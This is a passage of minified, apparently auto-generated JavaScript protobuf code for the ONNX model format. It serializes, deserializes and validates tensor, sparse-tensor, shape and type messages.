encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},TensorProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TensorProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:if(message.dims&&message.dims.length||(message.dims=[]),2==(7&tag))for(var end2=reader.uint32()+reader.pos;reader.pos<end2;)message.dims.push(reader.int64());else message.dims.push(reader.int64());break;case 2:message.dataType=reader.int32();break;case 3:message.segment=$root.onnx.TensorProto.Segment.decode(reader,reader.uint32());break;case 4:if(message.floatData&&message.floatData.length||(message.floatData=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.floatData.push(reader.float());else message.floatData.push(reader.float());break;case 5:if(message.int32Data&&message.int32Data.length||(message.int32Data=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.int32Data.push(reader.int32());else message.int32Data.push(reader.int32());break;case 6:message.stringData&&message.stringData.length||(message.stringData=[]),message.stringData.push(reader.bytes());break;case 7:if(message.int64Data&&message.int64Data.length||(message.int64Data=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.int64Data.push(reader.int64());else message.int64Data.push(reader.int64());break;case 8:message.name=reader.string();break;case 12:message.docString=reader.string();break;case 9:message.rawData=reader.bytes();break;case 13:message.externalData&&message.externalData.length||(message.externalData=[]),message.externalData.push($root.onnx.StringStringEntryProto.decode(reader,reader.uint32()));break;case 14:message.dataLocation=reader.int32();break;case 10:if(message.doubleData&&message.doubleData.length||(message.doubleData=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.doubleData.push(reader.double());else message.doubleData.push(reader.double());break;case 11:if(message.uint64Data&&message.uint64Data.length||(message.uint64Data=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.uint64Data.push(reader.uint64());else message.uint64Data.push(reader.uint64());break;default:reader.skipType(7&tag)}}return message},TensorProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},TensorProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.dims&&message.hasOwnProperty("dims")){if(!Array.isArray(message.dims))return"dims: array expected";for(var i=0;i<message.dims.length;++i)if(!($util.isInteger(message.dims[i])||message.dims[i]&&$util.isInteger(message.dims[i].low)&&$util.isInteger(message.dims[i].high)))return"dims: integer|Long[] expected"}if(null!=message.dataType&&message.hasOwnProperty("dataType")&&!$util.isInteger(message.dataType))return"dataType: integer expected";if(null!=message.segment&&message.hasOwnProperty("segment")&&(error=$root.onnx.TensorProto.Segment.verify(message.segment)))return"segment."+error;if(null!=message.floatData&&message.hasOwnProperty("floatData")){if(!Array.isArray(message.floatData))return"floatData: array expected";for(i=0;i<message.floatData.length;++i)if("number"!=typeof message.floatData[i])return"floatData: number[] expected"}if(null!=message.int32Data&&message.hasOwnProperty("int32Data")){if(!Array.isArray(message.int32Data))return"int32Data: array expected";for(i=0;i<message.int32Data.length;++i)if(!$util.isInteger(message.int32Data[i]))return"int32Data: integer[] expected"}if(null!=message.stringData&&message.hasOwnProperty("stringData")){if(!Array.isArray(message.stringData))return"stringData: array expected";for(i=0;i<message.stringData.length;++i)if(!(message.stringData[i]&&"number"==typeof message.stringData[i].length||$util.isString(message.stringData[i])))return"stringData: buffer[] expected"}if(null!=message.int64Data&&message.hasOwnProperty("int64Data")){if(!Array.isArray(message.int64Data))return"int64Data: array expected";for(i=0;i<message.int64Data.length;++i)if(!($util.isInteger(message.int64Data[i])||message.int64Data[i]&&$util.isInteger(message.int64Data[i].low)&&$util.isInteger(message.int64Data[i].high)))return"int64Data: integer|Long[] expected"}if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString))return"docString: string expected";if(null!=message.rawData&&message.hasOwnProperty("rawData")&&!(message.rawData&&"number"==typeof message.rawData.length||$util.isString(message.rawData)))return"rawData: buffer expected";if(null!=message.externalData&&message.hasOwnProperty("externalData")){if(!Array.isArray(message.externalData))return"externalData: array expected";for(i=0;i<message.externalData.length;++i){var error;if(error=$root.onnx.StringStringEntryProto.verify(message.externalData[i]))return"externalData."+error}}if(null!=message.dataLocation&&message.hasOwnProperty("dataLocation"))switch(message.dataLocation){default:return"dataLocation: enum value expected";case 0:case 1:}if(null!=message.doubleData&&message.hasOwnProperty("doubleData")){if(!Array.isArray(message.doubleData))return"doubleData: array expected";for(i=0;i<message.doubleData.length;++i)if("number"!=typeof message.doubleData[i])return"doubleData: number[] expected"}if(null!=message.uint64Data&&message.hasOwnProperty("uint64Data")){if(!Array.isArray(message.uint64Data))return"uint64Data: array expected";for(i=0;i<message.uint64Data.length;++i)if(!($util.isInteger(message.uint64Data[i])||message.uint64Data[i]&&$util.isInteger(message.uint64Data[i].low)&&$util.isInteger(message.uint64Data[i].high)))return"uint64Data: integer|Long[] expected"}return null},TensorProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.TensorProto)return object;var message=new $root.onnx.TensorProto;if(object.dims){if(!Array.isArray(object.dims))throw TypeError(".onnx.TensorProto.dims: array expected");message.dims=[];for(var i=0;i<object.dims.length;++i)$util.Long?(message.dims[i]=$util.Long.fromValue(object.dims[i])).unsigned=!1:"string"==typeof object.dims[i]?message.dims[i]=parseInt(object.dims[i],10):"number"==typeof object.dims[i]?message.dims[i]=object.dims[i]:"object"==typeof object.dims[i]&&(message.dims[i]=new $util.LongBits(object.dims[i].low>>>0,object.dims[i].high>>>0).toNumber())}if(null!=object.dataType&&(message.dataType=0|object.dataType),null!=object.segment){if("object"!=typeof object.segment)throw TypeError(".onnx.TensorProto.segment: object expected");message.segment=$root.onnx.TensorProto.Segment.fromObject(object.segment)}if(object.floatData){if(!Array.isArray(object.floatData))throw TypeError(".onnx.TensorProto.floatData: array expected");for(message.floatData=[],i=0;i<object.floatData.length;++i)message.floatData[i]=Number(object.floatData[i])}if(object.int32Data){if(!Array.isArray(object.int32Data))throw TypeError(".onnx.TensorProto.int32Data: array expected");for(message.int32Data=[],i=0;i<object.int32Data.length;++i)message.int32Data[i]=0|object.int32Data[i]}if(object.stringData){if(!Array.isArray(object.stringData))throw TypeError(".onnx.TensorProto.stringData: array expected");for(message.stringData=[],i=0;i<object.stringData.length;++i)"string"==typeof object.stringData[i]?$util.base64.decode(object.stringData[i],message.stringData[i]=$util.newBuffer($util.base64.length(object.stringData[i])),0):object.stringData[i].length>=0&&(message.stringData[i]=object.stringData[i])}if(object.int64Data){if(!Array.isArray(object.int64Data))throw TypeError(".onnx.TensorProto.int64Data: array expected");for(message.int64Data=[],i=0;i<object.int64Data.length;++i)$util.Long?(message.int64Data[i]=$util.Long.fromValue(object.int64Data[i])).unsigned=!1:"string"==typeof object.int64Data[i]?message.int64Data[i]=parseInt(object.int64Data[i],10):"number"==typeof object.int64Data[i]?message.int64Data[i]=object.int64Data[i]:"object"==typeof object.int64Data[i]&&(message.int64Data[i]=new $util.LongBits(object.int64Data[i].low>>>0,object.int64Data[i].high>>>0).toNumber())}if(null!=object.name&&(message.name=String(object.name)),null!=object.docString&&(message.docString=String(object.docString)),null!=object.rawData&&("string"==typeof object.rawData?$util.base64.decode(object.rawData,message.rawData=$util.newBuffer($util.base64.length(object.rawData)),0):object.rawData.length>=0&&(message.rawData=object.rawData)),object.externalData){if(!Array.isArray(object.externalData))throw TypeError(".onnx.TensorProto.externalData: array expected");for(message.externalData=[],i=0;i<object.externalData.length;++i){if("object"!=typeof object.externalData[i])throw TypeError(".onnx.TensorProto.externalData: object expected");message.externalData[i]=$root.onnx.StringStringEntryProto.fromObject(object.externalData[i])}}switch(object.dataLocation){default:if("number"==typeof object.dataLocation){message.dataLocation=object.dataLocation;break}break;case"DEFAULT":case 0:message.dataLocation=0;break;case"EXTERNAL":case 1:message.dataLocation=1}if(object.doubleData){if(!Array.isArray(object.doubleData))throw TypeError(".onnx.TensorProto.doubleData: array expected");for(message.doubleData=[],i=0;i<object.doubleData.length;++i)message.doubleData[i]=Number(object.doubleData[i])}if(object.uint64Data){if(!Array.isArray(object.uint64Data))throw TypeError(".onnx.TensorProto.uint64Data: array expected");for(message.uint64Data=[],i=0;i<object.uint64Data.length;++i)$util.Long?(message.uint64Data[i]=$util.Long.fromValue(object.uint64Data[i])).unsigned=!0:"string"==typeof object.uint64Data[i]?message.uint64Data[i]=parseInt(object.uint64Data[i],10):"number"==typeof object.uint64Data[i]?message.uint64Data[i]=object.uint64Data[i]:"object"==typeof object.uint64Data[i]&&(message.uint64Data[i]=new $util.LongBits(object.uint64Data[i].low>>>0,object.uint64Data[i].high>>>0).toNumber(!0))}return message},TensorProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.dims=[],object.floatData=[],object.int32Data=[],object.stringData=[],object.int64Data=[],object.doubleData=[],object.uint64Data=[],object.externalData=[]),options.defaults&&(object.dataType=0,object.segment=null,object.name="",options.bytes===String?object.rawData="":(object.rawData=[],options.bytes!==Array&&(object.rawData=$util.newBuffer(object.rawData))),object.docString="",object.dataLocation=options.enums===String?"DEFAULT":0),message.dims&&message.dims.length){object.dims=[];for(var j=0;j<message.dims.length;++j)"number"==typeof message.dims[j]?object.dims[j]=options.longs===String?String(message.dims[j]):message.dims[j]:object.dims[j]=options.longs===String?$util.Long.prototype.toString.call(message.dims[j]):options.longs===Number?new $util.LongBits(message.dims[j].low>>>0,message.dims[j].high>>>0).toNumber():message.dims[j]}if(null!=message.dataType&&message.hasOwnProperty("dataType")&&(object.dataType=message.dataType),null!=message.segment&&message.hasOwnProperty("segment")&&(object.segment=$root.onnx.TensorProto.Segment.toObject(message.segment,options)),message.floatData&&message.floatData.length)for(object.floatData=[],j=0;j<message.floatData.length;++j)object.floatData[j]=options.json&&!isFinite(message.floatData[j])?String(message.floatData[j]):message.floatData[j];if(message.int32Data&&message.int32Data.length)for(object.int32Data=[],j=0;j<message.int32Data.length;++j)object.int32Data[j]=message.int32Data[j];if(message.stringData&&message.stringData.length)for(object.stringData=[],j=0;j<message.stringData.length;++j)object.stringData[j]=options.bytes===String?$util.base64.encode(message.stringData[j],0,message.stringData[j].length):options.bytes===Array?Array.prototype.slice.call(message.stringData[j]):message.stringData[j];if(message.int64Data&&message.int64Data.length)for(object.int64Data=[],j=0;j<message.int64Data.length;++j)"number"==typeof message.int64Data[j]?object.int64Data[j]=options.longs===String?String(message.int64Data[j]):message.int64Data[j]:object.int64Data[j]=options.longs===String?$util.Long.prototype.toString.call(message.int64Data[j]):options.longs===Number?new $util.LongBits(message.int64Data[j].low>>>0,message.int64Data[j].high>>>0).toNumber():message.int64Data[j];if(null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),null!=message.rawData&&message.hasOwnProperty("rawData")&&(object.rawData=options.bytes===String?$util.base64.encode(message.rawData,0,message.rawData.length):options.bytes===Array?Array.prototype.slice.call(message.rawData):message.rawData),message.doubleData&&message.doubleData.length)for(object.doubleData=[],j=0;j<message.doubleData.length;++j)object.doubleData[j]=options.json&&!isFinite(message.doubleData[j])?String(message.doubleData[j]):message.doubleData[j];if(message.uint64Data&&message.uint64Data.length)for(object.uint64Data=[],j=0;j<message.uint64Data.length;++j)"number"==typeof message.uint64Data[j]?object.uint64Data[j]=options.longs===String?String(message.uint64Data[j]):message.uint64Data[j]:object.uint64Data[j]=options.longs===String?$util.Long.prototype.toString.call(message.uint64Data[j]):options.longs===Number?new $util.LongBits(message.uint64Data[j].low>>>0,message.uint64Data[j].high>>>0).toNumber(!0):message.uint64Data[j];if(null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),message.externalData&&message.externalData.length)for(object.externalData=[],j=0;j<message.externalData.length;++j)object.externalData[j]=$root.onnx.StringStringEntryProto.toObject(message.externalData[j],options);return null!=message.dataLocation&&message.hasOwnProperty("dataLocation")&&(object.dataLocation=options.enums===String?void 0===$root.onnx.TensorProto.DataLocation[message.dataLocation]?message.dataLocation:$root.onnx.TensorProto.DataLocation[message.dataLocation]:message.dataLocation),object},TensorProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},TensorProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TensorProto"},TensorProto.DataType=function(){var valuesById={},values=Object.create(valuesById);return values[valuesById[0]="UNDEFINED"]=0,values[valuesById[1]="FLOAT"]=1,values[valuesById[2]="UINT8"]=2,values[valuesById[3]="INT8"]=3,values[valuesById[4]="UINT16"]=4,values[valuesById[5]="INT16"]=5,values[valuesById[6]="INT32"]=6,values[valuesById[7]="INT64"]=7,values[valuesById[8]="STRING"]=8,values[valuesById[9]="BOOL"]=9,values[valuesById[10]="FLOAT16"]=10,values[valuesById[11]="DOUBLE"]=11,values[valuesById[12]="UINT32"]=12,values[valuesById[13]="UINT64"]=13,values[valuesById[14]="COMPLEX64"]=14,values[valuesById[15]="COMPLEX128"]=15,values[valuesById[16]="BFLOAT16"]=16,values[valuesById[17]="FLOAT8E4M3FN"]=17,values[valuesById[18]="FLOAT8E4M3FNUZ"]=18,values[valuesById[19]="FLOAT8E5M2"]=19,values[valuesById[20]="FLOAT8E5M2FNUZ"]=20,values}(),TensorProto.Segment=function(){function Segment(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return Segment.prototype.begin=$util.Long?$util.Long.fromBits(0,0,!1):0,Segment.prototype.end=$util.Long?$util.Long.fromBits(0,0,!1):0,Segment.create=function create(properties){return new Segment(properties)},Segment.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.begin&&Object.hasOwnProperty.call(message,"begin")&&writer.uint32(8).int64(message.begin),null!=message.end&&Object.hasOwnProperty.call(message,"end")&&writer.uint32(16).int64(message.end),writer},Segment.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Segment.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TensorProto.Segment;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.begin=reader.int64();break;case 2:message.end=reader.int64();break;default:reader.skipType(7&tag)}}return message},Segment.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Segment.verify=function verify(message){return"object"!=typeof message||null===message?"object expected":null!=message.begin&&message.hasOwnProperty("begin")&&!($util.isInteger(message.begin)||message.begin&&$util.isInteger(message.begin.low)&&$util.isInteger(message.begin.high))?"begin: integer|Long expected":null!=message.end&&message.hasOwnProperty("end")&&!($util.isInteger(message.end)||message.end&&$util.isInteger(message.end.low)&&$util.isInteger(message.end.high))?"end: integer|Long expected":null},Segment.fromObject=function fromObject(object){if(object instanceof $root.onnx.TensorProto.Segment)return object;var message=new $root.onnx.TensorProto.Segment;return null!=object.begin&&($util.Long?(message.begin=$util.Long.fromValue(object.begin)).unsigned=!1:"string"==typeof object.begin?message.begin=parseInt(object.begin,10):"number"==typeof object.begin?message.begin=object.begin:"object"==typeof object.begin&&(message.begin=new $util.LongBits(object.begin.low>>>0,object.begin.high>>>0).toNumber())),null!=object.end&&($util.Long?(message.end=$util.Long.fromValue(object.end)).unsigned=!1:"string"==typeof object.end?message.end=parseInt(object.end,10):"number"==typeof object.end?message.end=object.end:"object"==typeof object.end&&(message.end=new $util.LongBits(object.end.low>>>0,object.end.high>>>0).toNumber())),message},Segment.toObject=function toObject(message,options){options||(options={});var object={};if(options.defaults){if($util.Long){var long=new $util.Long(0,0,!1);object.begin=options.longs===String?long.toString():options.longs===Number?long.toNumber():long}else object.begin=options.longs===String?"0":0;$util.Long?(long=new $util.Long(0,0,!1),object.end=options.longs===String?long.toString():options.longs===Number?long.toNumber():long):object.end=options.longs===String?"0":0}return null!=message.begin&&message.hasOwnProperty("begin")&&("number"==typeof message.begin?object.begin=options.longs===String?String(message.begin):message.begin:object.begin=options.longs===String?$util.Long.prototype.toString.call(message.begin):options.longs===Number?new $util.LongBits(message.begin.low>>>0,message.begin.high>>>0).toNumber():message.begin),null!=message.end&&message.hasOwnProperty("end")&&("number"==typeof message.end?object.end=options.longs===String?String(message.end):message.end:object.end=options.longs===String?$util.Long.prototype.toString.call(message.end):options.longs===Number?new $util.LongBits(message.end.low>>>0,message.end.high>>>0).toNumber():message.end),object},Segment.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Segment.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TensorProto.Segment"},Segment}(),TensorProto.DataLocation=function(){var valuesById={},values=Object.create(valuesById);return values[valuesById[0]="DEFAULT"]=0,values[valuesById[1]="EXTERNAL"]=1,values}(),TensorProto}(),onnx.SparseTensorProto=function(){function SparseTensorProto(properties){if(this.dims=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return SparseTensorProto.prototype.values=null,SparseTensorProto.prototype.indices=null,SparseTensorProto.prototype.dims=$util.emptyArray,SparseTensorProto.create=function create(properties){return new SparseTensorProto(properties)},SparseTensorProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.values&&Object.hasOwnProperty.call(message,"values")&&$root.onnx.TensorProto.encode(message.values,writer.uint32(10).fork()).ldelim(),null!=message.indices&&Object.hasOwnProperty.call(message,"indices")&&$root.onnx.TensorProto.encode(message.indices,writer.uint32(18).fork()).ldelim(),null!=message.dims&&message.dims.length){writer.uint32(26).fork();for(var i=0;i<message.dims.length;++i)writer.int64(message.dims[i]);writer.ldelim()}return writer},SparseTensorProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},SparseTensorProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.SparseTensorProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.values=$root.onnx.TensorProto.decode(reader,reader.uint32());break;case 2:message.indices=$root.onnx.TensorProto.decode(reader,reader.uint32());break;case 3:if(message.dims&&message.dims.length||(message.dims=[]),2==(7&tag))for(var end2=reader.uint32()+reader.pos;reader.pos<end2;)message.dims.push(reader.int64());else message.dims.push(reader.int64());break;default:reader.skipType(7&tag)}}return message},SparseTensorProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},SparseTensorProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";var error;if(null!=message.values&&message.hasOwnProperty("values")&&(error=$root.onnx.TensorProto.verify(message.values)))return"values."+error;if(null!=message.indices&&message.hasOwnProperty("indices")&&(error=$root.onnx.TensorProto.verify(message.indices)))return"indices."+error;if(null!=message.dims&&message.hasOwnProperty("dims")){if(!Array.isArray(message.dims))return"dims: array expected";for(var i=0;i<message.dims.length;++i)if(!($util.isInteger(message.dims[i])||message.dims[i]&&$util.isInteger(message.dims[i].low)&&$util.isInteger(message.dims[i].high)))return"dims: integer|Long[] expected"}return null},SparseTensorProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.SparseTensorProto)return object;var message=new $root.onnx.SparseTensorProto;if(null!=object.values){if("object"!=typeof object.values)throw TypeError(".onnx.SparseTensorProto.values: object expected");message.values=$root.onnx.TensorProto.fromObject(object.values)}if(null!=object.indices){if("object"!=typeof object.indices)throw TypeError(".onnx.SparseTensorProto.indices: object expected");message.indices=$root.onnx.TensorProto.fromObject(object.indices)}if(object.dims){if(!Array.isArray(object.dims))throw TypeError(".onnx.SparseTensorProto.dims: array expected");message.dims=[];for(var i=0;i<object.dims.length;++i)$util.Long?(message.dims[i]=$util.Long.fromValue(object.dims[i])).unsigned=!1:"string"==typeof object.dims[i]?message.dims[i]=parseInt(object.dims[i],10):"number"==typeof object.dims[i]?message.dims[i]=object.dims[i]:"object"==typeof object.dims[i]&&(message.dims[i]=new $util.LongBits(object.dims[i].low>>>0,object.dims[i].high>>>0).toNumber())}return message},SparseTensorProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.dims=[]),options.defaults&&(object.values=null,object.indices=null),null!=message.values&&message.hasOwnProperty("values")&&(object.values=$root.onnx.TensorProto.toObject(message.values,options)),null!=message.indices&&message.hasOwnProperty("indices")&&(object.indices=$root.onnx.TensorProto.toObject(message.indices,options)),message.dims&&message.dims.length){object.dims=[];for(var j=0;j<message.dims.length;++j)"number"==typeof message.dims[j]?object.dims[j]=options.longs===String?String(message.dims[j]):message.dims[j]:object.dims[j]=options.longs===String?$util.Long.prototype.toString.call(message.dims[j]):options.longs===Number?new $util.LongBits(message.dims[j].low>>>0,message.dims[j].high>>>0).toNumber():message.dims[j]}return object},SparseTensorProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},SparseTensorProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.SparseTensorProto"},SparseTensorProto}(),onnx.TensorShapeProto=function(){function TensorShapeProto(properties){if(this.dim=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return TensorShapeProto.prototype.dim=$util.emptyArray,TensorShapeProto.create=function create(properties){return new TensorShapeProto(properties)},TensorShapeProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.dim&&message.dim.length)for(var i=0;i<message.dim.length;++i)$root.onnx.TensorShapeProto.Dimension.encode(message.dim[i],writer.uint32(10).fork()).ldelim();return writer},TensorShapeProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},TensorShapeProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TensorShapeProto;reader.pos<end;){var tag=reader.uint32();tag>>>3==1?(message.dim&&message.dim.length||(message.dim=[]),message.dim.push($root.onnx.TensorShapeProto.Dimension.decode(reader,reader.uint32()))):reader.skipType(7&tag)}return message},TensorShapeProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},TensorShapeProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.dim&&message.hasOwnProperty("dim")){if(!Array.isArray(message.dim))return"dim: array expected";for(var i=0;i<message.dim.length;++i){var error=$root.onnx.TensorShapeProto.Dimension.verify(message.dim[i]);if(error)return"dim."+error}}return null},TensorShapeProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.TensorShapeProto)return object;var message=new $root.onnx.TensorShapeProto;if(object.dim){if(!Array.isArray(object.dim))throw TypeError(".onnx.TensorShapeProto.dim: array expected");message.dim=[];for(var i=0;i<object.dim.length;++i){if("object"!=typeof object.dim[i])throw TypeError(".onnx.TensorShapeProto.dim: object expected");message.dim[i]=$root.onnx.TensorShapeProto.Dimension.fromObject(object.dim[i])}}return message},TensorShapeProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.dim=[]),message.dim&&message.dim.length){object.dim=[];for(var j=0;j<message.dim.length;++j)object.dim[j]=$root.onnx.TensorShapeProto.Dimension.toObject(message.dim[j],options)}return object},TensorShapeProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},TensorShapeProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TensorShapeProto"},TensorShapeProto.Dimension=function(){function Dimension(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}var $oneOfFields;return Dimension.prototype.dimValue=null,Dimension.prototype.dimParam=null,Dimension.prototype.denotation="",Object.defineProperty(Dimension.prototype,"value",{get:$util.oneOfGetter($oneOfFields=["dimValue","dimParam"]),set:$util.oneOfSetter($oneOfFields)}),Dimension.create=function create(properties){return new Dimension(properties)},Dimension.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.dimValue&&Object.hasOwnProperty.call(message,"dimValue")&&writer.uint32(8).int64(message.dimValue),null!=message.dimParam&&Object.hasOwnProperty.call(message,"dimParam")&&writer.uint32(18).string(message.dimParam),null!=message.denotation&&Object.hasOwnProperty.call(message,"denotation")&&writer.uint32(26).string(message.denotation),writer},Dimension.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Dimension.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TensorShapeProto.Dimension;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.dimValue=reader.int64();break;case 2:message.dimParam=reader.string();break;case 3:message.denotation=reader.string();break;default:reader.skipType(7&tag)}}return message},Dimension.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Dimension.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";var properties={};if(null!=message.dimValue&&message.hasOwnProperty("dimValue")&&(properties.value=1,!($util.isInteger(message.dimValue)||message.dimValue&&$util.isInteger(message.dimValue.low)&&$util.isInteger(message.dimValue.high))))return"dimValue: integer|Long expected";if(null!=message.dimParam&&message.hasOwnProperty("dimParam")){if(1===properties.value)return"value: multiple values";if(properties.value=1,!$util.isString(message.dimParam))return"dimParam: string expected"}return null!=message.denotation&&message.hasOwnProperty("denotation")&&!$util.isString(message.denotation)?"denotation: string expected":null},Dimension.fromObject=function fromObject(object){if(object instanceof $root.onnx.TensorShapeProto.Dimension)return object;var message=new $root.onnx.TensorShapeProto.Dimension;return null!=object.dimValue&&($util.Long?(message.dimValue=$util.Long.fromValue(object.dimValue)).unsigned=!1:"string"==typeof object.dimValue?message.dimValue=parseInt(object.dimValue,10):"number"==typeof object.dimValue?message.dimValue=object.dimValue:"object"==typeof object.dimValue&&(message.dimValue=new $util.LongBits(object.dimValue.low>>>0,object.dimValue.high>>>0).toNumber())),null!=object.dimParam&&(message.dimParam=String(object.dimParam)),null!=object.denotation&&(message.denotation=String(object.denotation)),message},Dimension.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.denotation=""),null!=message.dimValue&&message.hasOwnProperty("dimValue")&&("number"==typeof message.dimValue?object.dimValue=options.longs===String?String(message.dimValue):message.dimValue:object.dimValue=options.longs===String?$util.Long.prototype.toString.call(message.dimValue):options.longs===Number?new $util.LongBits(message.dimValue.low>>>0,message.dimValue.high>>>0).toNumber():message.dimValue,options.oneofs&&(object.value="dimValue")),null!=message.dimParam&&message.hasOwnProperty("dimParam")&&(object.dimParam=message.dimParam,options.oneofs&&(object.value="dimParam")),null!=message.denotation&&message.hasOwnProperty("denotation")&&(object.denotation=message.denotation),object},Dimension.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Dimension.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TensorShapeProto.Dimension"},Dimension}(),TensorShapeProto}(),onnx.TypeProto=function(){function TypeProto(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}var $oneOfFields;return TypeProto.prototype.tensorType=null,TypeProto.prototype.sequenceType=null,TypeProto.prototype.mapType=null,TypeProto.prototype.optionalType=null,TypeProto.prototype.sparseTensorType=null,TypeProto.prototype.denotation="",Object.defineProperty(TypeProto.prototype,"value",{get:$util.oneOfGetter($oneOfFields=["tensorType","sequenceType","mapType","optionalType","sparseTensorType"]),set:$util.oneOfSetter($oneOfFields)}),TypeProto.create=function create(properties){return new TypeProto(properties)},TypeProto.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.tensorType&&Object.hasOwnProperty.call(message,"tensorType")&&$root.onnx.TypeProto.Tensor.encode(message.tensorType,writer.uint32(10).fork()).ldelim(),null!=message.sequenceType&&Object.hasOwnProperty.call(message,"sequenceType")&&$root.onnx.TypeProto.Sequence.encode(message.sequenceType,writer.uint32(34).fork()).ldelim(),null!=message.mapType&&Object.hasOwnProperty.call(message,"mapType")&&$root.onnx.TypeProto.Map.encode(message.mapType,writer.uint32(42).fork()).ldelim(),null!=message.denotation&&Object.hasOwnProperty.call(message,"denotation")&&writer.uint32(50).string(message.denotation),null!=message.sparseTensorType&&Object.hasOwnProperty.call(message,"sparseTensorType")&&$root.onnx.TypeProto.SparseTensor.encode(message.sparseTensorType,writer.uint32(66).fork()).ldelim(),null!=message.optionalType&&Object.hasOwnProperty.call(message,"optionalType")&&$root.onnx.TypeProto.Optional.encode(message.optionalType,writer.uint32(74).fork()).ldelim(),writer},TypeProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},TypeProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 